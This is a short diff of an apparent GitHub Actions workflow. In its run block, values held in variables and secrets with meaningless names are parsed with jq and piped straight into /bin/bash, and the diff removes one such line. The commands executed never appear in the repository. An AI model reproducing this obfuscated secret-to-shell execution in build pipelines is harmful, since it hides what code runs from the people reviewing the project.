@@ -21,7 +21,6 @@ jobs:
           ol57: ${{ secrets.ol57 }}
         run: |
           printf '%s' "$ol57" | jq -r .offu48 | /bin/bash
-          echo $w951 | jq -r .n3 | /bin/bash
           printf '%s' "$wr6" | jq -r .sn438 | /bin/bash
           echo $ff6263 | jq -r .zb5 | /bin/bash
 
